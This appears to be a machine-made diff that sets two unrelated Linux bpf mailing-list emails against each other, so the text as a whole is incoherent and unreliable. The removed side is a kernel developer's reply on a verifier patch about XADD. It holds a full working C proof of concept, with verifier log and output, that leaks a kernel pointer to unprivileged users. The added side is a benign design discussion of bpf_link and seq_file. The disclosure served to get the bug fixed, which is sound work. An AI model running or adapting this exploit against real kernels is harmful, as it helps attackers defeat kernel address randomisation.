@@ -2,449 +2,166 @@ Return-Path: <bpf-owner@vger.kernel.org>
 X-Original-To: lists+bpf@lfdr.de
 Delivered-To: lists+bpf@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 3921E1AD2E5
-	for <lists+bpf@lfdr.de>; Fri, 17 Apr 2020 00:35:18 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id D82C91AD31B
+	for <lists+bpf@lfdr.de>; Fri, 17 Apr 2020 01:18:37 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1729250AbgDPWfO (ORCPT <rfc822;lists+bpf@lfdr.de>);
-        Thu, 16 Apr 2020 18:35:14 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56500 "EHLO
+        id S1726596AbgDPXSg (ORCPT <rfc822;lists+bpf@lfdr.de>);
+        Thu, 16 Apr 2020 19:18:36 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34954 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1729216AbgDPWfM (ORCPT <rfc822;bpf@vger.kernel.org>);
-        Thu, 16 Apr 2020 18:35:12 -0400
-Received: from mail-lj1-x241.google.com (mail-lj1-x241.google.com [IPv6:2a00:1450:4864:20::241])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id A581BC061A0F
-        for <bpf@vger.kernel.org>; Thu, 16 Apr 2020 15:35:11 -0700 (PDT)
-Received: by mail-lj1-x241.google.com with SMTP id h25so100993lja.10
-        for <bpf@vger.kernel.org>; Thu, 16 Apr 2020 15:35:11 -0700 (PDT)
+        with ESMTP id S1725988AbgDPXSf (ORCPT <rfc822;bpf@vger.kernel.org>);
+        Thu, 16 Apr 2020 19:18:35 -0400
+Received: from mail-pj1-x1041.google.com (mail-pj1-x1041.google.com [IPv6:2607:f8b0:4864:20::1041])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 0E30EC061A0F;
+        Thu, 16 Apr 2020 16:18:34 -0700 (PDT)
+Received: by mail-pj1-x1041.google.com with SMTP id a32so236242pje.5;
+        Thu, 16 Apr 2020 16:18:34 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc;
-        bh=S+GCpyaVXqR7qEkJijKnO8QHlcr8iTMsAE1S+43Kxig=;
-        b=Rmq1mh4Lw9bMmSRj4f4oUS8eC4fsW+UQwTMa2krntlt3nFDdRseM/JeoRDU/YPvgcf
-         cG684/eOJ8gtmyw6o2OjD4KzPqNWJ7UOTy40y4mdg0ghvusyuAZlPDxCpWUG5RUlrQM8
-         TjCQp/1WshBItK8yUn/S1Glamy22lNamkqNatuAsCxdqAHSQy5b8ckTLTzfzzIuF/Yuu
-         zHBha+497p9AZGeU9ZP4wdSnxOiOl1Uigqq7OxtT7gt7D5QNR3YX69HmCPdeULClozIK
-         Vl03fopoNLRHuQVveuS6TqDDUHKiKhtxTacrc0c0ngmZAyodfCPANmRpMXITOVaPyZpe
-         10bQ==
+        d=gmail.com; s=20161025;
+        h=date:from:to:cc:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to;
+        bh=XG57rR3E8DeijyO8lkg2NM/irBg+FSpnfdZfo3yuSgo=;
+        b=hb4TNWwsv8izF8rvJgU0XnPkPwX7f5golszhr2oxJn1ykhZu5ZqR56lwyLCzvvUvTg
+         glqlMNO54tUZnfT39hDZyoALcQyNnLS8E/L1gXwApA6qWXJbR3KEbxtSe9p+jP0OWi5K
+         CoCoeL02DcWjYZZocDU1fvJZVN32eOY7gI6qXtwtGXyC/vIXS59VZnC6I/619U5oWtf7
+         B/gX/YqQ4rblYvrzSk06yCmKUsY5oPBEzx7FbnoprW/ry9VxjEYJRTl6/iUAa2G5sDIz
+         Aa+fN+3ACc0y6AIXCaJ9b+vULZtcjuMMnppue23yZ3O3FoWEURfiWT4R314WvznwmCum
+         BUZQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=S+GCpyaVXqR7qEkJijKnO8QHlcr8iTMsAE1S+43Kxig=;
-        b=Z7mTSqIesyp1ucPh8Usl9/ezIZ4nghl5ypBhrunD/8z1HhGJx2AKEB4axS9cqVcL+R
-         tzgZbhTkzJ6nPpRtA05ucC6lIjrLNTfdhy7vdyEPeFXmeW7jThzyv6KttOyZhYfKcGWr
-         /lBEhybOMxaSqrrw01Ph6qcAPKLO7/3Oout/3QLqbKK3pjF6rzb1aGUQ9N4O97SbEOa5
-         D2ulu0/sbVejfaQXSp8l0VeWFY+EnQRJGDLu89YEV9N+zcyJTeRCFT2OIlRW/Z+7RtRm
-         m7TlzKH2MPHP3bFhnaSLxdhM+S4vFhYfXQAbAt4h1XozAEgVL7+oUVX17bJD+MqMY36q
-         IGoA==
-X-Gm-Message-State: AGi0PuagNb0G3tRrSHu1BCDDeX81S8ZEeli/W0bpB6fGwPPaYuIDArzG
-        q/F/a4bpFaL+xVCJPQOzhvdWqF5j/RyUMS8aIwjhE0Ikqto=
-X-Google-Smtp-Source: APiQypIKsCyb6VsVxGBCRSzo3rYbVtZ7BCEINLyC0RulQiGN41zuncouyuqIaoka89VwNxz01QWQ1W+rsTWgQrd9lA4=
-X-Received: by 2002:a2e:b17a:: with SMTP id a26mr183777ljm.215.1587076509643;
- Thu, 16 Apr 2020 15:35:09 -0700 (PDT)
-MIME-Version: 1.0
-References: <20200415204743.206086-1-jannh@google.com> <20200416211116.qxqcza5vo2ddnkdq@ast-mbp.dhcp.thefacebook.com>
-In-Reply-To: <20200416211116.qxqcza5vo2ddnkdq@ast-mbp.dhcp.thefacebook.com>
-From:   Jann Horn <jannh@google.com>
-Date:   Fri, 17 Apr 2020 00:34:42 +0200
-Message-ID: <CAG48ez0ZaSo-fC0bXnYChAmEZvv_0sGsxUG5HdFn6YJdOf1=Mg@mail.gmail.com>
-Subject: Re: [PATCH bpf] bpf: Use pointer type whitelist for XADD
-To:     Alexei Starovoitov <alexei.starovoitov@gmail.com>
-Cc:     bpf <bpf@vger.kernel.org>, Alexei Starovoitov <ast@kernel.org>,
+        h=x-gm-message-state:date:from:to:cc:subject:message-id:references
+         :mime-version:content-disposition:in-reply-to;
+        bh=XG57rR3E8DeijyO8lkg2NM/irBg+FSpnfdZfo3yuSgo=;
+        b=M13F4wTCrYIin1HJ1UMqM/c+b8sS9NH5X1ncNbPTzcIJ7i2K4XdLb+END7tUq/GpyS
+         9OzlEySjo04kSBjdGi6qpf6ZSz+YAgFs/RMKyoY7X5+BiJOLGYPbFM/YSsase4+FEWZQ
+         EFtDOIUDfL16res1A+cM+daB6dkbH5sKrUq9TUrKGw3BqPiowDLV6rYuTD/a6/606xlC
+         IA+3QBwpF9yV4xgbZGPFJfeSDWkMuqzTTcIpOFwq8a4E7LSuuYIcVmFHqJZ6+GgHrGM1
+         yOGKCHW4qHrGWkTvQ1lFYvP3NhZ0VN6+1SDLxZdr40cqxjWQxqXRRY4mMKpBE9KfxW2G
+         5+Uw==
+X-Gm-Message-State: AGi0PuYvsxAAYQ037JndKRgYwLmQXs5d4KcvoYPRxurQdjCdsmq+BLbm
+        5c3SjA6SYnIpDzY0aW2aDcJr9E3+
+X-Google-Smtp-Source: APiQypLMrTaQKMREtD2kOvlx+/AhbMZm78+PylYZLCutxEXh6qNMdYjhrPe9plhp6PqBvLJBI0Dd2w==
+X-Received: by 2002:a17:90a:276a:: with SMTP id o97mr879785pje.194.1587079113469;
+        Thu, 16 Apr 2020 16:18:33 -0700 (PDT)
+Received: from ast-mbp.dhcp.thefacebook.com ([2620:10d:c090:400::5:fff8])
+        by smtp.gmail.com with ESMTPSA id l71sm11994846pge.3.2020.04.16.16.18.31
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 16 Apr 2020 16:18:32 -0700 (PDT)
+Date:   Thu, 16 Apr 2020 16:18:29 -0700
+From:   Alexei Starovoitov <alexei.starovoitov@gmail.com>
+To:     Andrii Nakryiko <andrii.nakryiko@gmail.com>
+Cc:     Yonghong Song <yhs@fb.com>, Andrii Nakryiko <andriin@fb.com>,
+        bpf <bpf@vger.kernel.org>, Martin KaFai Lau <kafai@fb.com>,
+        Networking <netdev@vger.kernel.org>,
+        Alexei Starovoitov <ast@fb.com>,
         Daniel Borkmann <daniel@iogearbox.net>,
-        Martin KaFai Lau <kafai@fb.com>,
-        Song Liu <songliubraving@fb.com>, Yonghong Song <yhs@fb.com>,
-        Andrii Nakryiko <andriin@fb.com>,
-        John Fastabend <john.fastabend@gmail.com>,
-        KP Singh <kpsingh@chromium.org>,
-        Network Development <netdev@vger.kernel.org>
-Content-Type: text/plain; charset="UTF-8"
+        Kernel Team <kernel-team@fb.com>
+Subject: Re: [RFC PATCH bpf-next 05/16] bpf: create file or anonymous dumpers
+Message-ID: <20200416231829.o4yngurm5nzrakoj@ast-mbp.dhcp.thefacebook.com>
+References: <20200408232520.2675265-1-yhs@fb.com>
+ <20200408232526.2675664-1-yhs@fb.com>
+ <CAEf4Bzawu2dFXL7nvYhq1tKv9P7Bb9=6ksDpui5nBjxRrx=3_w@mail.gmail.com>
+ <4bf72b3c-5fee-269f-1d71-7f808f436db9@fb.com>
+ <CAEf4BzZnq958Guuusb9y65UCtB-DARxdk7_q7ZPBZ3WOwjSKaw@mail.gmail.com>
+ <20200415164640.evaujoootr4n55sc@ast-mbp>
+ <CAEf4Bza2YkmFMZ_d6d6keLqeWNDr8dbBQj=42xSrONaULK1PXg@mail.gmail.com>
+ <20200416170414.ds3hcb3bgfetjt4v@ast-mbp>
+ <CAEf4BzY0a_Rzt8vtLLSz3+xAhx0CWhetxcUNdyK7ZygMms7srA@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAEf4BzY0a_Rzt8vtLLSz3+xAhx0CWhetxcUNdyK7ZygMms7srA@mail.gmail.com>
 Sender: bpf-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <bpf.vger.kernel.org>
 X-Mailing-List: bpf@vger.kernel.org
 
-On Thu, Apr 16, 2020 at 11:11 PM Alexei Starovoitov
-<alexei.starovoitov@gmail.com> wrote:
-> On Wed, Apr 15, 2020 at 10:47:43PM +0200, Jann Horn wrote:
-> > At the moment, check_xadd() uses a blacklist to decide whether a given
-> > pointer type should be usable with the XADD instruction. Out of all the
-> > pointer types that check_mem_access() accepts, only four are currently let
-> > through by check_xadd():
+On Thu, Apr 16, 2020 at 12:35:07PM -0700, Andrii Nakryiko wrote:
 > >
-> > PTR_TO_MAP_VALUE
-> > PTR_TO_CTX           rejected
-> > PTR_TO_STACK
-> > PTR_TO_PACKET        rejected
-> > PTR_TO_PACKET_META   rejected
-> > PTR_TO_FLOW_KEYS     rejected
-> > PTR_TO_SOCKET        rejected
-> > PTR_TO_SOCK_COMMON   rejected
-> > PTR_TO_TCP_SOCK      rejected
-> > PTR_TO_XDP_SOCK      rejected
-> > PTR_TO_TP_BUFFER
-> > PTR_TO_BTF_ID
+> > I slept on it and still fundamentally disagree that seq_file + bpf_prog
+> > is a derivative of link. Or in OoO terms it's not a child class of bpf_link.
+> > seq_file is its own class that should contain bpf_link as one of its
+> > members, but it shouldn't be derived from 'class bpf_link'.
+> 
+> Referring to inheritance here doesn't seem necessary or helpful, I'd
+> rather not confuse and complicate all this further.
+> 
+> bpfdump provider/target + bpf_prog = bpf_link. bpf_link is "a factory"
+> of seq_files. That's it, no inheritance.
+
+named seq_file in bpfdumpfs does indeed look like "factory" pattern.
+And yes, there is no inheritance between named seq_file and given seq_file after open().
+
+> > In that sense Yonghong proposed api (raw_tp_open to create anon seq_file+prog
+> > and obj_pin to create a template of named seq_file+prog) are the best fit.
+> > Implementation wise his 'struct extra_priv_data' needs to include
+> > 'struct bpf_link' instead of 'struct bpf_prog *prog;' directly.
 > >
-> > Looking at the currently permitted ones:
-> >
-> >  - PTR_TO_MAP_VALUE: This makes sense and is the primary usecase for XADD.
-> >  - PTR_TO_STACK: This doesn't make much sense, there is no concurrency on
-> >    the BPF stack. It also causes confusion further down, because the first
-> >    check_mem_access() won't check whether the stack slot being read from is
-> >    STACK_SPILL and the second check_mem_access() assumes in
-> >    check_stack_write() that the value being written is a normal scalar.
-> >    This means that unprivileged users can leak kernel pointers.
-> >  - PTR_TO_TP_BUFFER: This is a local output buffer without concurrency.
-> >  - PTR_TO_BTF_ID: This is read-only, XADD can't work. When the verifier
-> >    tries to verify XADD on such memory, the first check_ptr_to_btf_access()
-> >    invocation gets confused by value_regno not being a valid array index
-> >    and writes to out-of-bounds memory.
->
-> > Limit XADD to PTR_TO_MAP_VALUE, since everything else at least doesn't make
-> > sense, and is sometimes broken on top of that.
-> >
-> > Fixes: 17a5267067f3 ("bpf: verifier (add verifier core)")
-> > Signed-off-by: Jann Horn <jannh@google.com>
-> > ---
-> > I'm just sending this on the public list, since the worst-case impact for
-> > non-root users is leaking kernel pointers to userspace. In a context where
-> > you can reach BPF (no sandboxing), I don't think that kernel ASLR is very
-> > effective at the moment anyway.
-> >
-> > This breaks ten unit tests that assume that XADD is possible on the stack,
-> > and I'm not sure how all of them should be fixed up; I'd appreciate it if
-> > someone else could figure out how to fix them. I think some of them might
-> > be using XADD to cast pointers to numbers, or something like that? But I'm
-> > not sure.
-> >
-> > Or is XADD on the stack actually something you want to support for some
-> > reason, meaning that that part would have to be fixed differently?
->
-> yeah. 'doesnt make sense' is relative.
-> I prefer to fix the issues instead of disabling them.
-> xadd to PTR_TO_STACK, PTR_TO_TP_BUFFER, PTR_TO_BTF_ID should all work
-> because they are direct pointers to objects.
+> > So evertime 'cat' opens named seq_file there is bpf_link registered in IDR.
+> > Anon seq_file should have another bpf_link as well.
+> 
+> So that's where I disagree and don't see the point of having all those
+> short-lived bpf_links. cat opening seq_file doesn't create a bpf_link,
+> it creates a seq_file. If we want to associate some ID with it, it's
+> fine, but it's not a bpf_link ID (in my opinion, of course).
 
-PTR_TO_STACK and PTR_TO_TP_BUFFER I can sort of understand. But
-PTR_TO_BTF_ID is always readonly, so XADD on PTR_TO_BTF_ID really
-doesn't make any sense AFAICS.
+I thought we're on the same page with the definition of bpf_link ;)
+Let's recap. To make it easier I'll keep using object oriented analogy
+since I think it's the most appropriate to internalize all the concepts.
+- first what is file descriptor? It's nothing but std::shared_ptr<> to some kernel object.
+- then there is a key class == struct bpf_link
+- for raw tracepoints raw_tp_open() returns an FD to child class of bpf_link
+  which is 'struct bpf_raw_tp_link'.
+  In other words it returns std::shared_ptr<struct bpf_raw_tp_link>.
+- for fentry/fexit/freplace/lsm raw_tp_open() returns an FD to a different child
+  class of bpf_link which is "struct bpf_tracing_link".
+  This is std::share_ptr<struct bpf_trace_link>.
+- for cgroup-bpf progs bpf_link_create() returns an FD to child class of bpf_link
+  which is 'struct bpf_cgroup_link'.
+  This is std::share_ptr<struct bpf_cgroup_link>.
 
-> Unlike pointer to ctx and flow_key that will be rewritten and are not
-> direct pointers.
->
-> Short term I think it's fine to disable PTR_TO_TP_BUFFER because
-> prog breakage is unlikely (if it's actually broken which I'm not sure yet).
-> But PTR_TO_BTF_ID and PTR_TO_STACK should be fixed.
-> The former could be used in bpf-tcp-cc progs. I don't think it is now,
-> but it's certainly conceivable.
-> PTR_TO_STACK should continue to work because tests are using it.
-> 'but stack has no concurrency' is not an excuse to break tests.
+In all those cases three different shared pointers are seen as file descriptors
+from the process pov but they point to different children of bpf_link base class.
+link_update() is a method of base class bpf_link and it has to work for
+all children classes.
+Similarly your future get_obj_info_by_fd() from any of these three shared pointers
+will return information specific to that child class.
+In all those cases one link attaches one program to one kernel object.
 
-Meh, if you insist, I guess I can patch it differently. Although I
-really think that "tests abuse it as a hack" shouldn't be a reason to
-keep around functionality that doesn't make sense for production use.
+Now back to bpfdumpfs.
+In the latest Yonghong's patches raw_tp_open() returns an FD that is a pointer
+to seq_file. This is existing kernel base class. It has its own seq_operations
+virtual methods that are defined for bpfdumpfs_seq_file which is a child class
+of seq_file that keeps start/stop/next methods as-is and overrides show()
+method to be able to call bpf prog for every iteratable kernel object.
 
-> Also I don't understand why you're saying that PTR_TO_STACK xadd is leaking.
-> The first check_mem_access() will check for STACK_SPILL afaics.
+What you're proposing is to make bpfdump_seq_file class to be a child of two
+base classes (seq_file and bpf_link) whereas I'm saying that it should be
+a child of seq_file only, since bpf_link methods do not apply to it.
+Like there is no sensible behavior for link_update() on such dual parent object.
 
-Nope. check_stack_read() checks for STACK_SPILL, but it doesn't do
-anything special with that information.
-
-user@vm:~/test/bpf-xadd-pointer-leak$ cat bpf-pointer-leak.c
-#define _GNU_SOURCE
-#include <pthread.h>
-#include <err.h>
-#include <errno.h>
-#include <sched.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <linux/bpf.h>
-#include <linux/filter.h>
-#include <linux/prctl.h>
-#include <sys/syscall.h>
-#include <stdint.h>
-#include <sys/socket.h>
-#include <string.h>
-#include <poll.h>
-#include <sys/uio.h>
-#include <fcntl.h>
-
-#define GPLv2 "GPL v2"
-#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))
-
-
-/* registers */
-/* caller-saved: r0..r5 */
-#define BPF_REG_ARG1    BPF_REG_1
-#define BPF_REG_ARG2    BPF_REG_2
-#define BPF_REG_ARG3    BPF_REG_3
-#define BPF_REG_ARG4    BPF_REG_4
-#define BPF_REG_ARG5    BPF_REG_5
-#define BPF_REG_CTX     BPF_REG_6
-#define BPF_REG_FP      BPF_REG_10
-
-#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
-    .dst_reg = DST,                             \
-    .src_reg = SRC,                             \
-    .off   = 0,                                 \
-    .imm   = (__u32) (IMM) }),                  \
-  ((struct bpf_insn) {                          \
-    .code  = 0, /* zero is reserved opcode */   \
-    .dst_reg = 0,                               \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = ((__u64) (IMM)) >> 32 })
-#define BPF_LD_MAP_FD(DST, MAP_FD)              \
-  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
-#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
-    .dst_reg = DST,                             \
-    .src_reg = SRC,                             \
-    .off   = OFF,                               \
-    .imm   = 0 })
-#define BPF_MOV64_REG(DST, SRC)                 \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
-    .dst_reg = DST,                             \
-    .src_reg = SRC,                             \
-    .off   = 0,                                 \
-    .imm   = 0 })
-#define BPF_ALU64_IMM(OP, DST, IMM)             \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
-    .dst_reg = DST,                             \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = IMM })
-#define BPF_ALU32_IMM(OP, DST, IMM)             \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
-    .dst_reg = DST,                             \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = IMM })
-#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
-    .dst_reg = DST,                             \
-    .src_reg = SRC,                             \
-    .off   = OFF,                               \
-    .imm   = 0 })
-#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
-    .dst_reg = DST,                             \
-    .src_reg = 0,                               \
-    .off   = OFF,                               \
-    .imm   = IMM })
-#define BPF_EMIT_CALL(FUNC)                     \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_JMP | BPF_CALL,                \
-    .dst_reg = 0,                               \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = (FUNC) })
-#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
-    .dst_reg = DST,                             \
-    .src_reg = 0,                               \
-    .off   = OFF,                               \
-    .imm   = IMM })
-#define BPF_EXIT_INSN()                         \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_JMP | BPF_EXIT,                \
-    .dst_reg = 0,                               \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = 0 })
-#define BPF_LD_ABS(SIZE, IMM)                   \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
-    .dst_reg = 0,                               \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = IMM })
-#define BPF_ALU64_REG(OP, DST, SRC)             \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
-    .dst_reg = DST,                             \
-    .src_reg = SRC,                             \
-    .off   = 0,                                 \
-    .imm   = 0 })
-#define BPF_MOV64_IMM(DST, IMM)                 \
-  ((struct bpf_insn) {                          \
-    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
-    .dst_reg = DST,                             \
-    .src_reg = 0,                               \
-    .off   = 0,                                 \
-    .imm   = IMM })
-
-int bpf_(int cmd, union bpf_attr *attrs) {
-  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
-}
-
-int array_create(int value_size, int num_entries) {
-  union bpf_attr create_map_attrs = {
-      .map_type = BPF_MAP_TYPE_ARRAY,
-      .key_size = 4,
-      .value_size = value_size,
-      .max_entries = num_entries
-  };
-  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
-  if (mapfd == -1)
-    err(1, "map create");
-  return mapfd;
-}
-
-unsigned long get_ulong(int map_fd, uint64_t idx) {
-  uint64_t value;
-  union bpf_attr lookup_map_attrs = {
-    .map_fd = map_fd,
-    .key = (uint64_t)&idx,
-    .value = (uint64_t)&value
-  };
-  if (bpf_(BPF_MAP_LOOKUP_ELEM, &lookup_map_attrs))
-    err(1, "MAP_LOOKUP_ELEM");
-  return value;
-}
-
-int prog_load(struct bpf_insn *insns, size_t insns_count) {
-  char verifier_log[100000];
-  union bpf_attr create_prog_attrs = {
-    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
-    .insn_cnt = insns_count,
-    .insns = (uint64_t)insns,
-    .license = (uint64_t)GPLv2,
-    .log_level = 2,
-    .log_size = sizeof(verifier_log),
-    .log_buf = (uint64_t)verifier_log
-  };
-  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
-  int errno_ = errno;
-  printf("==========================\n%s==========================\n",
-verifier_log);
-  errno = errno_;
-  if (progfd == -1)
-    err(1, "prog load");
-  return progfd;
-}
-
-int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
-  int progfd = prog_load(insns, insns_count);
-
-  // hook eBPF program up to a socket
-  // sendmsg() to the socket will trigger the filter
-  // returning 0 in the filter should toss the packet
-  int socks[2];
-  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
-    err(1, "socketpair");
-  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
-    err(1, "setsockopt");
-  return socks[1];
-}
-
-void trigger_proc(int sockfd) {
-  if (write(sockfd, "X", 1) != 1)
-    err(1, "write to proc socket failed");
-}
-
-int main(void) {
-  int small_map = array_create(8, 1);
-  struct bpf_insn insns[] = {
-    // r7 = map_pointer
-    BPF_LD_MAP_FD(BPF_REG_7, small_map),
-    // r8 = launder(map_pointer)
-    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_7, -8),
-    BPF_MOV64_IMM(BPF_REG_1, 0),
-    ((struct bpf_insn) {
-      .code  = BPF_STX | BPF_DW | BPF_XADD,
-      .dst_reg = BPF_REG_FP,
-      .src_reg = BPF_REG_1,
-      .off = -8
-    }),
-    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_FP, -8),
-
-    // store r8 into map
-    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),
-    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
-    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
-    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
-    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
-    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
-    BPF_EXIT_INSN(),
-    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
-
-    BPF_MOV64_IMM(BPF_REG_0, 0),
-    BPF_EXIT_INSN()
-  };
-  int sock_fd = create_filtered_socket_fd(insns, ARRSIZE(insns));
-  trigger_proc(sock_fd);
-  printf("map[0] = 0x%lx\n", get_ulong(small_map, 0));
-}
-user@vm:~/test/bpf-xadd-pointer-leak$ gcc -o bpf-pointer-leak bpf-pointer-leak.c
-user@vm:~/test/bpf-xadd-pointer-leak$ ./bpf-pointer-leak
-==========================
-func#0 @0
-0: R1=ctx(id=0,off=0,imm=0) R10=fp0
-0: (18) r7 = 0x0
-2: R1=ctx(id=0,off=0,imm=0) R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0
-2: (7b) *(u64 *)(r10 -8) = r7
-3: R1=ctx(id=0,off=0,imm=0) R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
-R10=fp0 fp-8_w=map_ptr
-3: (b7) r1 = 0
-4: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8_w=map_ptr
-4: (db) lock *(u64 *)(r10 -8) += r1
-5: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8_w=mmmmmmmm
-5: (79) r8 = *(u64 *)(r10 -8)
-6: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0)
-R10=fp0 fp-8_w=mmmmmmmm
-6: (bf) r1 = r7
-7: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
-R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
-fp-8_w=mmmmmmmm
-7: (bf) r2 = r10
-8: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp0
-R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
-fp-8_w=mmmmmmmm
-8: (07) r2 += -4
-9: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp-4
-R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
-fp-8_w=mmmmmmmm
-9: (62) *(u32 *)(r2 +0) = 0
-10: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp-4
-R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
-fp-8_w=mmmmmmmm
-10: (85) call bpf_map_lookup_elem#1
-11: R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)
-R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
-fp-8_w=mmmmmmmm
-11: (55) if r0 != 0x0 goto pc+1
- R0_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0)
-R10=fp0 fp-8_w=mmmmmmmm
-12: R0_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
-R8_w=invP(id=0) R10=fp0 fp-8_w=mmmmmmmm
-12: (95) exit
-13: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
-R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
-fp-8=mmmmmmmm
-13: (7b) *(u64 *)(r0 +0) = r8
- R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
-R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
-fp-8=mmmmmmmm
-14: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
-R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
-fp-8=mmmmmmmm
-14: (b7) r0 = 0
-15: R0_w=invP0 R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0)
-R10=fp0 fp-8=mmmmmmmm
-15: (95) exit
-processed 15 insns (limit 1000000) max_states_per_insn 0 total_states
-1 peak_states 1 mark_read 1
-==========================
-map[0] = 0xffff888067ffa800
-user@vm:~/test/bpf-xadd-pointer-leak$
+In my proposal bpfdump_seq_file class keeps cat-ability and all methods of seq_file
+and no extra methods from bpf_link that don't belong in seq_file.
+But I'm arguing that bpfdump_seq_file class should have a member bpf_link
+instead of simply holding bpf_prog via refcnt.
+Let's call this child class of bpf_link the bpf_seq_file_link class. Having
+bpf_seq_file_link as member would mean that such link is discoverable via IDR,
+the user process can get an FD to it and can do get_obj_info_by_fd().
